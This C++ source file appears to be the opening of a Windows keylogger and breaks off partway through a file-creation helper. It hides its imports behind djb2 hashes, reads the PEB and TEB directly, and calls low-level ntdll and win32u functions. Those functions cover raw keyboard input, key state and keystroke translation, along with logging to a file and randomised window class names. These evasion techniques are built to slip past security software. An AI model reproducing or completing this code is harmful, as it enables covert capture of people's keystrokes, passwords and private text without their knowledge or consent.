
#include <Windows.h>
#include <string>
#include <fstream>
#include <ctime>
#include <stdio.h>
#include <Dbt.h>        
#include <StrSafe.h>    
#include <ShlObj.h>      
#include <queue>
#include <mutex>
#include <condition_variable>
#include <thread>
#include <atomic>
#include <stdlib.h>
#include <powersetting.h>
#include <powrprof.h>
#include <cwchar>

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define OBJ_CASE_INSENSITIVE 0x00000040L
#define FILE_OPEN_IF 0x00000003
#define FILE_NON_DIRECTORY_FILE 0x00000040
#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020
#define WM_MAXIMUM   0x0001FFFF

typedef struct _LSA_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} LSA_UNICODE_STRING, * PLSA_UNICODE_STRING, UNICODE_STRING, * PUNICODE_STRING;

typedef struct _LDR_MODULE {
    LIST_ENTRY              InLoadOrderModuleList;
    LIST_ENTRY              InMemoryOrderModuleList;
    LIST_ENTRY              InInitializationOrderModuleList;
    PVOID                   BaseAddress;
    PVOID                   EntryPoint;
    ULONG                   SizeOfImage;
    UNICODE_STRING          FullDllName;
    UNICODE_STRING          BaseDllName;
    ULONG                   Flags;
    SHORT                   LoadCount;
    SHORT                   TlsIndex;
    LIST_ENTRY              HashTableEntry;
    ULONG                   TimeDateStamp;
} LDR_MODULE, * PLDR_MODULE;

typedef struct _PEB_LDR_DATA {
    ULONG                   Length;
    ULONG                   Initialized;
    PVOID                   SsHandle;
    LIST_ENTRY              InLoadOrderModuleList;
    LIST_ENTRY              InMemoryOrderModuleList;
    LIST_ENTRY              InInitializationOrderModuleList;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _PEB {
    BOOLEAN                 InheritedAddressSpace;
    BOOLEAN                 ReadImageFileExecOptions;
    BOOLEAN                 BeingDebugged;
    BOOLEAN                 Spare;
    HANDLE                  Mutant;
    PVOID                   ImageBase;
    PPEB_LDR_DATA           LoaderData;
    PVOID                   ProcessParameters;
    PVOID                   SubSystemData;
    PVOID                   ProcessHeap;
    PVOID                   FastPebLock;
    PVOID                   FastPebLockRoutine;
    PVOID                   FastPebUnlockRoutine;
    ULONG                   EnvironmentUpdateCount;
    PVOID* KernelCallbackTable;
    PVOID                   EventLogSection;
    PVOID                   EventLog;
    PVOID                   FreeList;
    ULONG                   TlsExpansionCounter;
    PVOID                   TlsBitmap;
    ULONG                   TlsBitmapBits[0x2];
    PVOID                   ReadOnlySharedMemoryBase;
    PVOID                   ReadOnlySharedMemoryHeap;
    PVOID* ReadOnlyStaticServerData;
    PVOID                   AnsiCodePageData;
    PVOID                   OemCodePageData;
    PVOID                   UnicodeCaseTableData;
    ULONG                   NumberOfProcessors;
    ULONG                   NtGlobalFlag;
    BYTE                    Spare2[0x4];
    LARGE_INTEGER           CriticalSectionTimeout;
    ULONG                   HeapSegmentReserve;
    ULONG                   HeapSegmentCommit;
    ULONG                   HeapDeCommitTotalFreeThreshold;
    ULONG                   HeapDeCommitFreeBlockThreshold;
    ULONG                   NumberOfHeaps;
    ULONG                   MaximumNumberOfHeaps;
    PVOID** ProcessHeaps;
    PVOID                   GdiSharedHandleTable;
    PVOID                   ProcessStarterHelper;
    PVOID                   GdiDCAttributeList;
    PVOID                   LoaderLock;
    ULONG                   OSMajorVersion;
    ULONG                   OSMinorVersion;
    ULONG                   OSBuildNumber;
    ULONG                   OSPlatformId;
    ULONG                   ImageSubSystem;
    ULONG                   ImageSubSystemMajorVersion;
    ULONG                   ImageSubSystemMinorVersion;
    ULONG                   GdiHandleBuffer[0x22];
    ULONG                   PostProcessInitRoutine;
    ULONG                   TlsExpansionBitmap;
    BYTE                    TlsExpansionBitmapBits[0x80];
    ULONG                   SessionId;
} PEB, * PPEB;

typedef struct __CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
}CLIENT_ID, * PCLIENT_ID;

typedef struct _RTLP_CURDIR_REF {
    LONG RefCount;
    HANDLE Handle;
}RTLP_CURDIR_REF, * PRTLP_CURDIR_REF;

typedef struct _RTL_RELATIVE_NAME_U {
    UNICODE_STRING RelativeName;
    HANDLE ContainingDirectory;
    PRTLP_CURDIR_REF CurDirRef;
}RTL_RELATIVE_NAME_U, * PRTL_RELATIVE_NAME_U;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
}  OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _FILE_STANDARD_INFORMATION {
    LARGE_INTEGER AllocationSize;
    LARGE_INTEGER EndOfFile;
    ULONG         NumberOfLinks;
    BOOLEAN       DeletePending;
    BOOLEAN       Directory;
} FILE_STANDARD_INFORMATION, * PFILE_STANDARD_INFORMATION;

typedef enum _FILE_INFORMATION_CLASS {
    FileDirectoryInformation = 1,
    FileFullDirectoryInformation,
    FileBothDirectoryInformation,
    FileBasicInformation,
    FileStandardInformation,
    FileInternalInformation,
    FileEaInformation,
    FileAccessInformation,
    FileNameInformation,
    FileRenameInformation,
    FileLinkInformation,
    FileNamesInformation,
    FileDispositionInformation,
    FilePositionInformation,
    FileFullEaInformation,
    FileModeInformation,
    FileAlignmentInformation,
    FileAllInformation,
    FileAllocationInformation,
    FileEndOfFileInformation,
    FileAlternateNameInformation,
    FileStreamInformation,
    FilePipeInformation,
    FilePipeLocalInformation,
    FilePipeRemoteInformation,
    FileMailslotQueryInformation,
    FileMailslotSetInformation,
    FileCompressionInformation,
    FileObjectIdInformation,
    FileCompletionInformation,
    FileMoveClusterInformation,
    FileQuotaInformation,
    FileReparsePointInformation,
    FileNetworkOpenInformation,
    FileAttributeTagInformation,
    FileTrackingInformation,
    FileIdBothDirectoryInformation,
    FileIdFullDirectoryInformation,
    FileValidDataLengthInformation,
    FileShortNameInformation,
    FileIoCompletionNotificationInformation,
    FileIoStatusBlockRangeInformation,
    FileIoPriorityHintInformation,
    FileSfioReserveInformation,
    FileSfioVolumeInformation,
    FileHardLinkInformation,
    FileProcessIdsUsingFileInformation,
    FileNormalizedNameInformation,
    FileNetworkPhysicalNameInformation,
    FileIdGlobalTxDirectoryInformation,
    FileIsRemoteDeviceInformation,
    FileUnusedInformation,
    FileNumaNodeInformation,
    FileStandardLinkInformation,
    FileRemoteProtocolInformation,
    FileRenameInformationBypassAccessCheck,
    FileLinkInformationBypassAccessCheck,
    FileVolumeNameInformation,
    FileIdInformation,
    FileIdExtdDirectoryInformation,
    FileReplaceCompletionInformation,
    FileHardLinkFullIdInformation,
    FileIdExtdBothDirectoryInformation,
    FileMaximumInformation
} FILE_INFORMATION_CLASS, * PFILE_INFORMATION_CLASS;

typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID    Pointer;
    };
    ULONG_PTR Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;

typedef struct _FILE_POSITION_INFORMATION {
    LARGE_INTEGER CurrentByteOffset;
} FILE_POSITION_INFORMATION, * PFILE_POSITION_INFORMATION;

typedef PVOID PACTIVATION_CONTEXT;

typedef struct _IO_APC_ROUTINE {
    VOID* ApcContext;
    PIO_STATUS_BLOCK IoStatusBlock;
    ULONG		     Reserved;
} IO_APC_ROUTINE, * PIO_APC_ROUTINE;

typedef struct _STRING {
    USHORT Length;
    USHORT MaximumLength;
    PCHAR  Buffer;
} ANSI_STRING, * PANSI_STRING;

typedef struct _RTL_DRIVE_LETTER_CURDIR {
    WORD Flags;
    WORD Length;
    ULONG TimeStamp;
    ANSI_STRING DosPath;
} RTL_DRIVE_LETTER_CURDIR, * PRTL_DRIVE_LETTER_CURDIR;

typedef struct _CURDIR {
    UNICODE_STRING DosPath;
    PVOID Handle;
}CURDIR, * PCURDIR;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
    ULONG MaximumLength;
    ULONG Length;
    ULONG Flags;
    ULONG DebugFlags;
    PVOID ConsoleHandle;
    ULONG ConsoleFlags;
    PVOID StandardInput;
    PVOID StandardOutput;
    PVOID StandardError;
    CURDIR CurrentDirectory;
    UNICODE_STRING DllPath;
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine;
    PVOID Environment;
    ULONG StartingX;
    ULONG StartingY;
    ULONG CountX;
    ULONG CountY;
    ULONG CountCharsX;
    ULONG CountCharsY;
    ULONG FillAttribute;
    ULONG WindowFlags;
    ULONG ShowWindowFlags;
    UNICODE_STRING WindowTitle;
    UNICODE_STRING DesktopInfo;
    UNICODE_STRING ShellInfo;
    UNICODE_STRING RuntimeData;
    RTL_DRIVE_LETTER_CURDIR CurrentDirectores[32];
    ULONG EnvironmentSize;
}RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

typedef struct _RTL_ACTIVATION_CONTEXT_STACK_FRAME {
    struct __RTL_ACTIVATION_CONTEXT_STACK_FRAME* Previous;
    PACTIVATION_CONTEXT ActivationContext;
    ULONG Flags;
} RTL_ACTIVATION_CONTEXT_STACK_FRAME, * PRTL_ACTIVATION_CONTEXT_STACK_FRAME;

typedef struct _ACTIVATION_CONTEXT_STACK {
    PRTL_ACTIVATION_CONTEXT_STACK_FRAME ActiveFrame;
    LIST_ENTRY FrameListCache;
    ULONG Flags;
    ULONG NextCookieSequenceNumber;
    ULONG StackId;
} ACTIVATION_CONTEXT_STACK, * PACTIVATION_CONTEXT_STACK;

typedef struct _GDI_TEB_BATCH {
    ULONG Offset;
    ULONG HDC;
    ULONG Buffer[310];
} GDI_TEB_BATCH, * PGDI_TEB_BATCH;

typedef struct _TEB_ACTIVE_FRAME_CONTEXT {
    ULONG Flags;
    PCHAR FrameName;
} TEB_ACTIVE_FRAME_CONTEXT, * PTEB_ACTIVE_FRAME_CONTEXT;

typedef struct _TEB_ACTIVE_FRAME {
    ULONG Flags;
    struct _TEB_ACTIVE_FRAME* Previous;
    PTEB_ACTIVE_FRAME_CONTEXT Context;
} TEB_ACTIVE_FRAME, * PTEB_ACTIVE_FRAME;

typedef struct _TEB
{
    NT_TIB				NtTib;
    PVOID				EnvironmentPointer;
    CLIENT_ID			ClientId;
    PVOID				ActiveRpcHandle;
    PVOID				ThreadLocalStoragePointer;
    PPEB				ProcessEnvironmentBlock;
    ULONG               LastErrorValue;
    ULONG               CountOfOwnedCriticalSections;
    PVOID				CsrClientThread;
    PVOID				Win32ThreadInfo;
    ULONG               User32Reserved[26];
    ULONG               UserReserved[5];
    PVOID				WOW32Reserved;
    LCID                CurrentLocale;
    ULONG               FpSoftwareStatusRegister;
    PVOID				SystemReserved1[54];
    LONG                ExceptionCode;
#if (NTDDI_VERSION >= NTDDI_LONGHORN)
    PACTIVATION_CONTEXT_STACK* ActivationContextStackPointer;
    UCHAR                  SpareBytes1[0x30 - 3 * sizeof(PVOID)];
    ULONG                  TxFsContext;
#elif (NTDDI_VERSION >= NTDDI_WS03)
    PACTIVATION_CONTEXT_STACK ActivationContextStackPointer;
    UCHAR                  SpareBytes1[0x34 - 3 * sizeof(PVOID)];
#else
    ACTIVATION_CONTEXT_STACK ActivationContextStack;
    UCHAR                  SpareBytes1[24];
#endif
    GDI_TEB_BATCH			GdiTebBatch;
    CLIENT_ID				RealClientId;
    PVOID					GdiCachedProcessHandle;
    ULONG                   GdiClientPID;
    ULONG                   GdiClientTID;
    PVOID					GdiThreadLocalInfo;
    PSIZE_T					Win32ClientInfo[62];
    PVOID					glDispatchTable[233];
    PSIZE_T					glReserved1[29];
    PVOID					glReserved2;
    PVOID					glSectionInfo;
    PVOID					glSection;
    PVOID					glTable;
    PVOID					glCurrentRC;
    PVOID					glContext;
    NTSTATUS                LastStatusValue;
    UNICODE_STRING			StaticUnicodeString;
    WCHAR                   StaticUnicodeBuffer[261];
    PVOID					DeallocationStack;
    PVOID					TlsSlots[64];
    LIST_ENTRY				TlsLinks;
    PVOID					Vdm;
    PVOID					ReservedForNtRpc;
    PVOID					DbgSsReserved[2];
#if (NTDDI_VERSION >= NTDDI_WS03)
    ULONG                   HardErrorMode;
#else
    ULONG                  HardErrorsAreDisabled;
#endif
#if (NTDDI_VERSION >= NTDDI_LONGHORN)
    PVOID					Instrumentation[13 - sizeof(GUID) / sizeof(PVOID)];
    GUID                    ActivityId;
    PVOID					SubProcessTag;
    PVOID					EtwLocalData;
    PVOID					EtwTraceData;
#elif (NTDDI_VERSION >= NTDDI_WS03)
    PVOID					Instrumentation[14];
    PVOID					SubProcessTag;
    PVOID					EtwLocalData;
#else
    PVOID					Instrumentation[16];
#endif
    PVOID					WinSockData;
    ULONG					GdiBatchCount;
#if (NTDDI_VERSION >= NTDDI_LONGHORN)
    BOOLEAN                SpareBool0;
    BOOLEAN                SpareBool1;
    BOOLEAN                SpareBool2;
#else
    BOOLEAN                InDbgPrint;
    BOOLEAN                FreeStackOnTermination;
    BOOLEAN                HasFiberData;
#endif
    UCHAR                  IdealProcessor;
#if (NTDDI_VERSION >= NTDDI_WS03)
    ULONG                  GuaranteedStackBytes;
#else
    ULONG                  Spare3;
#endif
    PVOID				   ReservedForPerf;
    PVOID				   ReservedForOle;
    ULONG                  WaitingOnLoaderLock;
#if (NTDDI_VERSION >= NTDDI_LONGHORN)
    PVOID				   SavedPriorityState;
    ULONG_PTR			   SoftPatchPtr1;
    ULONG_PTR			   ThreadPoolData;
#elif (NTDDI_VERSION >= NTDDI_WS03)
    ULONG_PTR			   SparePointer1;
    ULONG_PTR              SoftPatchPtr1;
    ULONG_PTR              SoftPatchPtr2;
#else
    Wx86ThreadState        Wx86Thread;
#endif
    PVOID* TlsExpansionSlots;
#if defined(_WIN64) && !defined(EXPLICIT_32BIT)
    PVOID                  DeallocationBStore;
    PVOID                  BStoreLimit;
#endif
    ULONG                  ImpersonationLocale;
    ULONG                  IsImpersonating;
    PVOID                  NlsCache;
    PVOID                  pShimData;
    ULONG                  HeapVirtualAffinity;
    HANDLE                 CurrentTransactionHandle;
    PTEB_ACTIVE_FRAME      ActiveFrame;
#if (NTDDI_VERSION >= NTDDI_WS03)
    PVOID FlsData;
#endif
#if (NTDDI_VERSION >= NTDDI_LONGHORN)
    PVOID PreferredLangauges;
    PVOID UserPrefLanguages;
    PVOID MergedPrefLanguages;
    ULONG MuiImpersonation;
    union
    {
        struct
        {
            USHORT SpareCrossTebFlags : 16;
        };
        USHORT CrossTebFlags;
    };
    union
    {
        struct
        {
            USHORT DbgSafeThunkCall : 1;
            USHORT DbgInDebugPrint : 1;
            USHORT DbgHasFiberData : 1;
            USHORT DbgSkipThreadAttach : 1;
            USHORT DbgWerInShipAssertCode : 1;
            USHORT DbgIssuedInitialBp : 1;
            USHORT DbgClonedThread : 1;
            USHORT SpareSameTebBits : 9;
        };
        USHORT SameTebFlags;
    };
    PVOID TxnScopeEntercallback;
    PVOID TxnScopeExitCAllback;
    PVOID TxnScopeContext;
    ULONG LockCount;
    ULONG ProcessRundown;
    ULONG64 LastSwitchTime;
    ULONG64 TotalSwitchOutTime;
    LARGE_INTEGER WaitReasonBitMap;
#else
    BOOLEAN SafeThunkCall;
    BOOLEAN BooleanSpare[3];
#endif
} TEB, * PTEB;

#define InitializeObjectAttributes(p, n, a, r, s) \
{ \
	(p)->Length = sizeof(OBJECT_ATTRIBUTES); \
	(p)->RootDirectory = r; \
	(p)->Attributes = a; \
	(p)->ObjectName = n; \
	(p)->SecurityDescriptor = s; \
	(p)->SecurityQualityOfService = NULL; \
}

#define HID_USAGE_PAGE_GENERIC 0x01
#define HID_USAGE_GENERIC_KEYBOARD 0x06

#define IS_ATOM(x) (((ULONG_PTR)(x) > 0x0) && ((ULONG_PTR)(x) < 0x10000))

typedef PVOID(NTAPI* RTLALLOCATEHEAP)(PVOID, ULONG, SIZE_T);
#define RTLALLOCATEHEAP_SIG 0xc0b381da

typedef BOOL(NTAPI* RTLFREEHEAP)(PVOID, ULONG, PVOID);
#define RTLFREEHEAP_SIG 0x70ba71d7

typedef NTSTATUS(NTAPI* LDRLOADDLL) (PWCHAR, DWORD, PUNICODE_STRING, PHANDLE);
#define LDRLOADDLL_SIG 0x0307db23

typedef NTSTATUS(NTAPI* NTCLOSE)(HANDLE);
#define NTCLOSE_SIG 0x8b8e133d

typedef NTSTATUS(NTAPI* NTCREATEFILE)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);
#define NTCREATEFILE_SIG 0x15a5ecdb

typedef NTSTATUS(NTAPI* RTLDOSPATHNAMETONTPATHNAME_U)(PCWSTR, PUNICODE_STRING, PCWSTR*, PRTL_RELATIVE_NAME_U);
#define RTLDOSPATHNAMETONTPATHNAME_U_SIG 0xbfe457b2

typedef LRESULT(NTAPI* NTDLLDEFWINDOWPROC_W)(HWND, UINT, WPARAM, LPARAM);
#define NTDLLDEFWINDOWPROC_W_SIG 0x058790f4

typedef NTSTATUS(NTAPI* NTQUERYINFORMATIONFILE)(HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG, FILE_INFORMATION_CLASS);
#define NTQUERYINFORMATIONFILE_SIG 0x4725f863

typedef NTSTATUS(NTAPI* NTSETINFORMATIONFILE) (HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG, FILE_INFORMATION_CLASS);
#define NTSETINFORMATIONFILE_SIG 0x6e88b479

typedef NTSTATUS(NTAPI* NTWRITEFILE)(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, PLARGE_INTEGER, PULONG);
#define NTWRITEFILE_SIG 0xd69326b2

//WIN32U

typedef VOID(NTAPI* NTUSERCALLONEPARAM)(DWORD, DWORD);
#define NTUSERCALLONEPARAM_SIG 0xb19a9f55

typedef BOOL(NTAPI* NTUSERDESTROYWINDOW)(HWND);
#define NTUSERDESTROYWINDOW_SIG 0xabad4a48

typedef BOOL(NTAPI* NTUSERREGISTERRAWINPUTDEVICES)(PCRAWINPUTDEVICE, UINT, UINT);
#define NTUSERREGISTERRAWINPUTDEVICES_SIG 0x76dc2408

typedef UINT(NTAPI* NTUSERGETRAWINPUTDATA)(HRAWINPUT, UINT, LPVOID, PUINT, UINT);
#define NTUSERGETRAWINPUTDATA_SIG 0xd902c31a

typedef BOOL(NTAPI* NTUSERGETKEYBOARDSTATE)(PBYTE);
#define NTUSERGETKEYBOARDSTATE_SIG 0x92ca3458

typedef INT(NTAPI* NTUSERTOUNICODEEX)(UINT, UINT, PBYTE, LPWSTR, INT, UINT, HKL);
#define NTUSERTOUNICODEEX_SIG 0xe561424d

typedef UINT(NTAPI* NTUSERMAPVIRTUALKEYEX)(UINT, UINT, UINT, UINT);
#define NTUSERMAPVIRTUALKEYEX_SIG 0xc8e8ef51

typedef INT(NTAPI* NTUSERGETKEYNAMETEXT)(LONG, LPWSTR, INT);
#define NTUSERGETKEYNAMETEXT_SIG 0x5be51535

typedef BOOL(NTAPI* NTUSERGETMESSAGE)(LPMSG, HWND, UINT, UINT);
#define NTUSERGETMESSAGE_SIG 0xb6c60f8b

typedef BOOL(NTAPI* NTUSERTRANSLATEMESSAGE)(PMSG, UINT);
#define NTUSERTRANSLATEMESSAGE_SIG 0xafc97a79




typedef struct API_IMPORT_TABLE {
    DWORD64 PeBase;				//NTDLL.DLL
    DWORD64 Win32uBase;			//WIN32U.DLL
    DWORD Error;				//GLOBAL ERROR HANDLER

    PPEB Peb;					//PEB POINTER
    PTEB Teb;					//TEB POINTER

    PWCHAR lpszClassNameBuffer;	//WINDOWS CLASS NAME

    //NTDLL IMPORTS
    LDRLOADDLL LdrLoadDll;
    RTLALLOCATEHEAP RtlAllocateHeap;
    RTLFREEHEAP RtlFreeHeap;
    NTCLOSE NtClose;
    NTCREATEFILE NtCreateFile;
    RTLDOSPATHNAMETONTPATHNAME_U RtlDosPathNameToNtPathName_U;
    NTDLLDEFWINDOWPROC_W NtdllDefWindowProc_W;
    NTQUERYINFORMATIONFILE NtQueryInformationFile;
    NTSETINFORMATIONFILE NtSetInformationFile;
    NTWRITEFILE NtWriteFile;

    //WIN32U IMPORTS
    NTUSERCALLONEPARAM NtUserCallOneParam;
    NTUSERDESTROYWINDOW NtUserDestroyWindow;
    NTUSERREGISTERRAWINPUTDEVICES NtUserRegisterRawInputDevices;
    NTUSERGETRAWINPUTDATA NtUserGetRawInputData;
    NTUSERGETKEYBOARDSTATE NtUserGetKeyboardState;
    NTUSERTOUNICODEEX NtUserToUnicodeEx;
    NTUSERMAPVIRTUALKEYEX NtUserMapVirtualKeyEx;
    NTUSERGETKEYNAMETEXT NtUserGetKeyNameText;
    NTUSERGETMESSAGE NtUserGetMessage;
    NTUSERTRANSLATEMESSAGE NtUserTranslateMessage;

}API_TABLE, PAPI_TABLE;

/*******************************************************************
 * Global Variables
 ******************************************************************/
API_TABLE       Api;
volatile HANDLE g_hLogFile = NULL;
volatile bool   g_bExitPowerThread = false;
HANDLE          g_hPowerThread = NULL;
CRITICAL_SECTION g_LogCriticalSection;
ULONG           Next = 2;

/*******************************************************************
 * Helper Functions (TEB, random, etc.)
 ******************************************************************/
PTEB GetTeb()
{
#if defined(_WIN64)
    return (PTEB)__readgsqword(0x30);
#elif defined(_WIN32)
    return (PTEB)__readfsdword(0x18);
#endif
}

INT PseudoInlineRandomSubroutine(PULONG ctx)
{
    return ((*ctx = *ctx * 1103515245 + 12345) % ((ULONG)RAND_MAX + 1));
}

INT PseudoInlineRandom()
{
    return PseudoInlineRandomSubroutine(&Next);
}

DWORD InlineTebGetLastError()
{
    return Api.Teb->LastErrorValue;
}

/*******************************************************************
 * String & Core Utility Classes
 ******************************************************************/
class StrUtility {
public:
    // Accept a const wchar_t* for 'src'
    static PWCHAR StringCopyW(PWCHAR dest, const wchar_t* src)
    {
        if (!dest || !src)
            return dest;
        PWCHAR p = dest;
        while ((*p++ = *src++) != 0) { /* empty */ }
        return dest;
    }

    // Accept a const wchar_t* for 'src'
    static PWCHAR StringConcatW(PWCHAR dest, const wchar_t* src)
    {
        if (!dest || !src)
            return dest;
        return StringCopyW(&dest[StringLengthW(dest)], src);
    }

    static SIZE_T StringLengthW(const wchar_t* String)
    {
        if (!String) return 0;
        const wchar_t* s = String;
        while (*s) s++;
        return (SIZE_T)(s - String);
    }

    static DWORD DecimalToAsciiW(PWCHAR String, LPDWORD dwArray, DWORD Length)
    {
        if (!String) return 0;
        for (DWORD i = 0; i < Length; i++)
            String[i] = (WCHAR)dwArray[i];
        return Length;
    }

    static PWCHAR UpperStringW(PWCHAR String)
    {
        if (!String) return nullptr;
        PWCHAR p = String;
        while (*p)
        {
            if (*p >= L'a' && *p <= L'z')
                *p = *p - (L'a' - L'A');
            p++;
        }
        return String;
    }

    static PWCHAR StringTokenW(PWCHAR str, const wchar_t* delim)
    {
        if (!str || !delim) return nullptr;
        PWCHAR spanPtr, token;
        int c, sc;
    RESTART:
        c = *str++;
        for (spanPtr = (PWCHAR)delim; (sc = *spanPtr++) != 0;)
        {
            if (c == sc)
                goto RESTART;
        }
        if (c == 0) return nullptr;
        token = str - 1;
        for (;;)
        {
            c = *str++;
            spanPtr = (PWCHAR)delim;
            do {
                if ((sc = *spanPtr++) == c)
                {
                    if (c == 0)
                        str = nullptr;
                    else
                        str[-1] = L'\0';
                    return token;
                }
            } while (sc != 0);
        }
        return nullptr;
    }

    static DWORD HashStringDjb2A(char* s)
    {
        if (!s) return 0;
        unsigned long hash = 5381;
        int c;
        while ((c = *s++))
            hash = ((hash << 5) + hash) + c;
        return hash;
    }

    static DWORD HashStringDjb2W(wchar_t* s)
    {
        if (!s) return 0;
        unsigned long hash = 5381;
        int c;
        while ((c = *s++))
            hash = ((hash << 5) + hash) + c;
        return hash;
    }

    static VOID RtlInitUnicodeString(PUNICODE_STRING dst, PCWSTR src)
    {
        if (!dst) return;
        if (src)
        {
            size_t size = StringLengthW(src) * sizeof(wchar_t);
            dst->Length = (USHORT)size;
            dst->MaximumLength = (USHORT)(size + sizeof(wchar_t));
            dst->Buffer = (PWCHAR)src;
        }
        else
        {
            dst->Length = 0;
            dst->MaximumLength = 0;
            dst->Buffer = nullptr;
        }
    }

    static PWCHAR RtlGeneratePseudoRandomString(SIZE_T length)
    {
        static const wchar_t DataSet[] = L"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        PWCHAR buf = (PWCHAR)Api.RtlAllocateHeap(Api.Peb->ProcessHeap, 0, (length + 1) * sizeof(wchar_t));
        if (!buf) return NULL;
        SIZE_T dsLen = StringLengthW(DataSet) - 1;  // exclude final \0
        for (SIZE_T i = 0; i < length; i++)
        {
            INT r = PseudoInlineRandom() % (INT)dsLen;
            buf[i] = DataSet[r];
        }
        buf[length] = 0;
        return buf;
    }
};

class CoreUtil {
private:
    static std::wstring currentBuffer;
    static LONGLONG     lastWritePosition;
    static size_t       lastWriteSize;
    static bool         isNewLine;
    static HWND         lastActiveWindow;
    static std::wstring lastWrittenLine;

public:
    static VOID RtlZeroMemoryInternal(PVOID Destination, SIZE_T Size)
    {
        memset(Destination, 0, Size);
    }
    static DWORD InlineUppGetEnvironmentVariableW(LPCWSTR Name, LPWSTR Buffer, DWORD Size)
    {
        UNICODE_STRING uString;
        RtlZeroMemoryInternal(&uString, sizeof(uString));
        UNICODE_STRING Variable;
        RtlZeroMemoryInternal(&Variable, sizeof(Variable));
        DWORD Token[1] = { 61 };
        LPWSTR EnvPtr = (LPWSTR)((PRTL_USER_PROCESS_PARAMETERS)Api.Peb->ProcessParameters)->Environment;
        BOOL found = FALSE;
        LPWSTR delim = (LPWSTR)Api.RtlAllocateHeap(Api.Peb->ProcessHeap, 0, 2 * sizeof(WCHAR));
        if (!delim) return 0;

        // '=' in ASCII is 61 decimal
        StrUtility::DecimalToAsciiW(delim, Token, 1);
        Name = StrUtility::UpperStringW((PWCHAR)Name);
        StrUtility::RtlInitUnicodeString(&Variable, (PWCHAR)Name);

        while (*EnvPtr)
        {
            DWORD nameHash = 0;
            DWORD envHash = 0;
            EnvPtr += StrUtility::StringLengthW(EnvPtr) + 1;
            PWCHAR pTok = StrUtility::StringTokenW(EnvPtr, delim);
            if (!pTok) break;
            pTok = StrUtility::UpperStringW(pTok);
            nameHash = StrUtility::HashStringDjb2W(Variable.Buffer);
            envHash = StrUtility::HashStringDjb2W(EnvPtr);
            if (nameHash == envHash)
            {
                EnvPtr += StrUtility::StringLengthW(EnvPtr) + 1;
                pTok = StrUtility::StringTokenW(EnvPtr, delim);
                if (!pTok) break;
                StrUtility::RtlInitUnicodeString(&uString, pTok);
                break;
            }
        }
        if (uString.Buffer && uString.Length)
        {
            StrUtility::StringCopyW(Buffer, uString.Buffer);
            found = TRUE;
        }
        Api.RtlFreeHeap(Api.Peb->ProcessHeap, 0, delim);
        return found ? uString.Length : 0;
    }
    static BOOL RtlLoadPeHeaders(PIMAGE_DOS_HEADER* Dos, PIMAGE_NT_HEADERS* Nt,
        PIMAGE_FILE_HEADER* File, PIMAGE_OPTIONAL_HEADER* Opt, PBYTE* Base)
    {
        *Dos = (PIMAGE_DOS_HEADER)(*Base);
        if ((*Dos)->e_magic != IMAGE_DOS_SIGNATURE)
            return FALSE;
        *Nt = (PIMAGE_NT_HEADERS)((PBYTE)*Dos + (*Dos)->e_lfanew);
        if ((*Nt)->Signature != IMAGE_NT_SIGNATURE)
            return FALSE;
        *File = (PIMAGE_FILE_HEADER)((PBYTE)*Nt + sizeof(DWORD));
        *Opt = (PIMAGE_OPTIONAL_HEADER)((PBYTE)*File + sizeof(IMAGE_FILE_HEADER));
        return TRUE;
    }
    static DWORD InlineRtlSetFilePointerToEnd(HANDLE File)
    {
        FILE_STANDARD_INFORMATION fsi;
        IO_STATUS_BLOCK ioStatus;
        RtlZeroMemoryInternal(&fsi, sizeof(fsi));
        RtlZeroMemoryInternal(&ioStatus, sizeof(ioStatus));
        NTSTATUS st = Api.NtQueryInformationFile(File, &ioStatus, &fsi, sizeof(fsi), FileStandardInformation);
        if (!NT_SUCCESS(st)) return INVALID_SET_FILE_POINTER;

        FILE_POSITION_INFORMATION fpi;
        RtlZeroMemoryInternal(&fpi, sizeof(fpi));
        fpi.CurrentByteOffset = fsi.EndOfFile;
        st = Api.NtSetInformationFile(File, &ioStatus, &fpi, sizeof(fpi), FilePositionInformation);
        if (!NT_SUCCESS(st)) return INVALID_SET_FILE_POINTER;
        return fpi.CurrentByteOffset.LowPart;
    }
    static HANDLE InlineNtdllNtCreateFile(LPCWSTR filename)
    {
        OBJECT_ATTRIBUTES oa;
        RtlZeroMemoryInternal(&oa, sizeof(oa));
        IO_STATUS_BLOCK iosb;
        RtlZeroMemoryInternal(&iosb, sizeof(iosb));
        LARGE_INTEGER size;
        size.QuadPart = 2048;
        UNICODE_STRING us;
        RtlZeroMemoryInternal(&us, sizeof(us));
        UNICODE_STRING ntPath;
        RtlZeroMemoryInternal(&ntPath, sizeof(ntPath));

        StrUtility::RtlInitUnicodeString(&us, filename);
        if (us.Buffer && us.Buffer[0] != L'\\')
            Api.RtlDosPathNameToNtPathName_U(us.Buffer, &ntPath, NULL, NULL);

        InitializeObjectAttributes(&oa, &ntPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
        HANDLE h = NULL;
        NTSTATUS st = Api.NtCreateFile(
            &h,
            FILE_GENERIC_WRITE | FILE_GENERIC_READ,
            &oa,
            &iosb,
            &size,
            FILE_ATTRIBUTE_NORMAL,
            FILE_SHARE_READ,
            FILE_OPEN_IF,
            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
            NULL, 0
        );
        if (!NT_SUCCESS(st)) return NULL;
